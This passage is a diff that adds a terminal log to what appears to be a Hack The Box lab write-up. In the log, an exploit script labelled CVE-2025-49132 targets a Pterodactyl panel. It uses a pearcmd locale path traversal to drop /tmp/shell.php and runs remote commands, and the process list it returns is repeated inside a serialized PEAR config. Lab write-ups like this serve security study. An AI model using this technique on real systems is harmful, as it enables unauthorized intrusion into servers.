@@ -540,3 +540,38 @@ a:13:{s:7:"php_dir";s:125:"/&locale=../../../../../../usr/share/php/PEAR&namespa
 ============================================================
 ```
 
+```
+ajdev@rootbox:~/HTB/Pterodactyl$ python3 exploit.py --host panel.pterodactyl.htb --command "ps aux | grep mysql"
+
+╔═══════════════════════════════════════════════════════════╗
+║           CVE-2025-49132 PEAR RCE Exploit                ║
+║           Target: panel.pterodactyl.htb                       ║
+╚═══════════════════════════════════════════════════════════╝
+
+[*] Target: http://panel.pterodactyl.htb
+[*] PEAR Path: ../../../../../../usr/share/php/PEAR
+[*] Command: ps aux | grep mysql
+
+[*] Writing payload to /tmp/shell.php...
+[+] Payload written
+[*] Executing payload...
+[+] Command executed successfully!
+
+============================================================
+OUTPUT:
+============================================================
+a:13:{s:7:"php_dir";s:128:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12776  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/php";s:8:"data_dir";s:129:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12779  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/data";s:7:"www_dir";s:128:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12782  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/www";s:7:"cfg_dir";s:128:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12785  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/cfg";s:7:"ext_dir";s:128:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12788  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/ext";s:7:"doc_dir";s:129:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12791  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/docs";s:8:"test_dir";s:130:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12794  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/tests";s:9:"cache_dir";s:130:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12797  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/cache";s:12:"download_dir";s:133:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12800  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/download";s:8:"temp_dir";s:129:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12803  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear/temp";s:7:"bin_dir";s:124:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+wwwrun   12806  0.0  0.0   5432  1792 ?        S    13:11   0:00 grep mysql/pear";s:7:"man_dir";s:128:"/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&/mysql     1374  0.0  7.9 1502788 160232 ?      Ssl  12:15   0:02 /usr/sbin/mysqld --defaults-file=/etc/my.cnf --user=mysql --socket=/run/mysql/mysql.sock
+============================================================
+```
+
